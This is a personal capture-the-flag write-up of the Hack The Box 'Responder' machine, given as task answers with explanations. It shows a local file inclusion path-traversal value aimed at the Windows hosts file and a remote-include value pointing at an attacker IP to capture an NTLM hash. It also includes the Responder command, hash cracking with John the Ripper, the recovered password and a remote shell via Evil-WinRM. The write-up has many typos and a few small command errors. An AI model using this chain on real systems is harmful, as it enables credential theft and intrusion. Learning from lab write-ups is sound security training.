Synopsis - Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials.

Upon scanning the network it shows port 80 is open with Appache httpd running on this network. This indicates to me this may be a webserver. 




![Shows denied access](Reference_Images/Screenshot_20260512_113821.png)



With further investigation I try to access the website and am met with the below error message.When visiting the web service using the IP address.

![Shows denied access](Reference_Images/Screenshot_20260512_113638.png)

Task 1

what is the domain that we are being redirected to?

Answer - unika.htb

Due to the website not working I belived it was due to my computer not being aware of the ip address.I used the /etc/hosts folder to update the address book and now I have access to the webiste. 

![website access](Reference_Images/Screenshot_20260512_132216.png)




Task 2

Which scripting language is being used on the server to generate webpages?
 
 Answer - PHP 

This was found by a curl command as shown below showing it uses PHP 

![curl command](Reference_Images/Screenshot_20260512_135517.png)


Task 3

What is the name of the URL parameter which is used to load different language versions of the webpage?

Answer - Page 

I found this by exploring the website and found the parameters have changed. Upon researching this paremeter could potentially be exploited witht the file inclusion vulnerablity. 

![Website url potential exploit](Reference_Images/Screenshot_20260514_160018.png)



![Website url potential exploit](Reference_Images/Screenshot_20260515_095029.png)

Task 4

Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"

Answer - ../../../../../../../../windows/system32/drivers/etc/hosts

Task 5

Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"

Answer - //10.10.14.6/somefile 

Task 6 

What does NTLM stand for?

Answer - NTLM stands for New Technology LAN Manager.

It is a suite of Microsoft security protocols used to authenticate users' identities and protect the confidentiality and integrity of their activity on a network.

At its core, NTLM is a challenge-response authentication mechanism. This means that instead of sending your actual password over the network when you try to log into a shared folder or a corporate server, the system uses a complex mathematical challenge to prove you know the password without ever exposing it to potential eavesdroppers.


Task 7

Which flag do we use in the Responder utility to specify the network interface?
 
 Answer - -I 
 
 Responder is a command line utility which is a specilaised network interception framework deisigned to abuse DNS fall back systems in internal Microfosoft networks. 
 
 For example if a work environment a client attempts to access resources through the standard proctocl but when thsi fails it fall backs to old protcol of contacting neighbouring networkorks on network asking in attamept to identify the host using broadcast and multibroadcasting.

Background info for Task 8 

Locating the Virtual Network Interface

Every computer has a physical network card.

When working in a lab environment like HTB (Hack The Box), when you connect to a VPN it creates a virtual network interface.

This handles network traffic and encrypts it.


Before running tools you need to know the exact name your operating system gave to this virtual network card.

ip -a


Handles network configurations.

tun0  outputs every NIC (Network Interface Card) available.

Under tun0 you see an IP address like a unique phone number for lab network.

Initialise attacking tool

sudo responder -I tun0

![responder initiated](Reference_Images/Screenshot_20260518_140159.png)

This starts several daemons (background services) on the machine. It turns my computer into a fake Windows File Server by opening up TCP port 445 (used for Windows file sharing) also known as SMB.

Runs in the background silently monitoring that network port.


Now in the web browser the remote file path is intiated with the following syntax. 

// - indicates this is a remote file the page needs to look for. 

Next the ip adress found with responder shown below (Below  tun0) 



![tun0](Reference_Images/Screenshot_20260519_074956.png)


Then a suedo file path used as a place holder as shown below. 

![website url](Reference_Images/Screenshot_20260514_160018.png)
 
This causes the server to spit back a has token as shown below which can the  be used with a specilaised tool called John the Ripper which is further expplained below.

![Respnder hash token](Reference_Images/Screenshot_20260518_140041.png)



 Task 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.

Answer John the Ripper 

John the Ripper - Offline hash pssword cracker 


Similiar in the way it formmated to wordlist used with gobuster and feroxbuster this uses a chosen wordlist to crack the hash code and is inputted as shown below. 

![Respnder hash token](Reference_Images/Screenshot_20260519_075822.png)


Task 9

What is the password for the administrator user?

Answer - Bandminton 





Task 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

Answer - 5985 

As shown in the orginal scan of ports 5985 was open which is usually used for windows remote management systems or can sometimes be port 5986 based on my research. 

Navigating the filesystem in evilwinrm

I did some research into how to naviage the file system for evil win rm as this is windows based which uses power shell and has some differences so once inside i used the below command to filter where the flag is and succesfully opened this. 

Task 11

On which user's desktop is the flag located?
 
 Answer - mike 
 
 Upon entering the system i ran the command 
 
 ls C:\Users 
 
 which showed the active users below. 
 
 Once I found this i then ran a filtering command which searched the file system for the flag needed to complete this box as shown below and successfully opened the flag.txt 
 
 ![shows the filter code and flag text](Reference_Images/Screenshot_20260520_090710.png)
